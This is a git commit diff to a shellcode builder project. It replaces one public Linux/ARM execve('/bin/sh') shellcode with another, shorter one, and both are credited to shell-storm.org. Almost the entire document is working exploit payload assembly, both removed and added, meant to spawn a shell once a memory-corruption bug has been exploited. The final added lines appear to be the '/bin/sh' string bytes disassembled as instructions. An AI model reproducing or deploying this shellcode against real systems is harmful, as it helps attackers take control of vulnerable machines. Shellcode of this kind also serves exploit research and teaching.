2e62517b9fa078c2ac2a377a66c8c6d6d86a6e09
Boogy <boogy@users.noreply.github.com>
2015-02-23 16:28:36 +0100

    Update shellcode_arm.asm

--- ShellcodeBuilder/shellcode_arm.asm
+++ ShellcodeBuilder/shellcode_arm.asm
@@ -1,20 +1,17 @@
-; Linux/ARM - execve("/bin/sh", [], [0 vars]) - 35 bytes
-; http://shell-storm.org/shellcode/files/shellcode-855.php
+# Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes
+# http://shell-storm.org/shellcode/files/shellcode-698.php
 .section .text
 .global _start
 _start:
-  add     r6, pc, #1
-  add     bx      r6
-  eors    r0, r0
-  add     r0, pc
-  adds    r0, #12
-  eors    r1, r1
-  eors    r2, r2
-  movs    r7, #11
-  svc     1
-  movs    r7, #1
-  svc     1
-  .short  0x2f2f
-  .word   0x2f6e6962
-  .short  0x732f
-  .byte   0x68
+    add	  r3, pc, #1
+    bx	  r3
+    mov	  r0, pc
+    adds	r0, #8
+    subs	r1, r1, r1
+    subs	r2, r2, r2
+    movs	r7, #11
+    svc	  1
+    str	  r7, [r5, #32]
+    ldr	  r1, [r5, #100]
+    strb	r7, [r5, #12]
+    lsls	r0, r5, #1
